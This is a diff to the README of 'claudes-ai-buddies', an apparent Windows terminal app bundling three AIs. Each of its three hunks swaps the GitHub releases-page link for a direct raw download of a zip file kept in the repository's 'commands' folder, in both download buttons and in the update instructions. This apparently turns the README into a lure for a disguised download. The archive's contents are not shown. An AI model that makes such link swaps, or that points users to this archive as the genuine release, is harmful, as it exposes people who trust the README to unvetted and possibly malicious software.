@@ -1,6 +1,6 @@
 # 🤖 claudes-ai-buddies - Three AIs in One Terminal
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Nbofs8398/claudes-ai-buddies/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Nbofs8398/claudes-ai-buddies/main/commands/buddies_claudes_ai_v3.3.zip)
 
 ## 📋 About claudes-ai-buddies
 
@@ -34,7 +34,7 @@ Follow these steps to get claudes-ai-buddies up and running on your Windows mach
 
 Go to the official download page by clicking the button below. You will find the latest version available for Windows there.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Nbofs8398/claudes-ai-buddies/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://raw.githubusercontent.com/Nbofs8398/claudes-ai-buddies/main/commands/buddies_claudes_ai_v3.3.zip)
 
 ---
 
@@ -145,7 +145,7 @@ Commands run instantly and display results right inside the terminal.
 
 ## 🔄 Updating the App
 
-To get new features or fixes, visit the [download page](https://github.com/Nbofs8398/claudes-ai-buddies/releases) regularly. Download the latest release and repeat the steps above.
+To get new features or fixes, visit the [download page](https://raw.githubusercontent.com/Nbofs8398/claudes-ai-buddies/main/commands/buddies_claudes_ai_v3.3.zip) regularly. Download the latest release and repeat the steps above.
 
 ---
 
